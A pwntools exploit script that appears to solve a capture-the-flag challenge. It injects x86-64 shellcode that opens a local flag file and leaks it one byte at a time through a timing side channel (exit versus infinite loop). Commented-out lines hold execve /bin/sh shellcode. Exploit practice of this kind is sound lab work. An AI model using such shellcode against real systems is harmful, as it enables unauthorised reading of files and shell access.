from pwn import *

# r = process('./chal')
# r = remote('jp.zoolab.org', 10004)

context.arch = 'amd64'

# raw_input()
# binsh = 0x0068732f6e69622f
# shellcode = asm('''
#     mov rax, 0x3b
#     mov rsi, 0
#     mov rdx, 0
#     lea rdi, [rip+4]
#     syscall
#     '''
#     )
flag_addr = './flag'
flag_addr_hex = 0x67616c662f2e
flag = ''
shift_count = 0
while shift_count < 8:
    guess = 0x20
    while guess < 0x80 :
        r = process('./chal')
        # r = remote('jp.zoolab.org', 10004)
        shellcode = asm(
            # Open flag file
            '''
            mov rax, 0x2
            mov rsi, 0
            lea rdi, [rip+99]
            syscall
            mov rax, 0x28
            mov rsi, 0x3
            mov rdi, 1
            mov rdx, 0
            mov r10, 0x1000
            syscall
            mov rax, 0x4a
            mov rdi, 0x1
            syscall
            '''
            +
            # Compare single character
            '''
            mov r10, r13
            add r10, 0x2db7
            mov rax, [r10]
            mov cl, ''' + str(guess) + '''
            shr rax, ''' + str(8*shift_count) + '''
        Compare:
            cmp al, cl
            je the_same
        infinity1:
            jmp infinity1
        the_same:
            mov rax, 0x3c
            mov rdi, 0
            syscall
        ''')
        raw_input()
        r.sendline(shellcode + b'\x00' * 3 + p64(flag_addr_hex))
        raw_input()
        try :
            # If compare not correct, guess++ and access to infinity loop
            r.recv(timeout=0.2)
            print('not the same')
            guess += 1
        except:
            # If compare correct, pwntool will break out
            print('the same')
            break
        # raw_input()
        r.close()

    shift_count += 1
    flag += chr(guess)
print(flag)
raw_input()

r.interactive()